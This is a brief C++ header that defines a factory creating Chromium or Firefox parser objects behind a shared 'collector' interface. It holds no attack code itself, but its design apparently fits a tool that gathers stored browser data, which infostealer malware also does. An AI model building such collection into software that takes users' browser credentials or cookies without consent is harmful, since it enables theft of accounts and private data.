#pragma once
#include "ICollector.h"
#include "ChromeParser.h"
#include "firefox_parser.h"

namespace collector
{
	enum class BrowserType
	{
		None,
		Chromium = 32,
		Mozilla = 64,
	};

	inline ICollector* create_collector(BrowserType type_collector)
	{
		switch (type_collector)
		{
			case BrowserType::None: return nullptr;
			case BrowserType::Chromium: return new chromium_parser();
			case BrowserType::Mozilla: return new firefox_parser();
			default: return nullptr;;
		}
	}
	
}
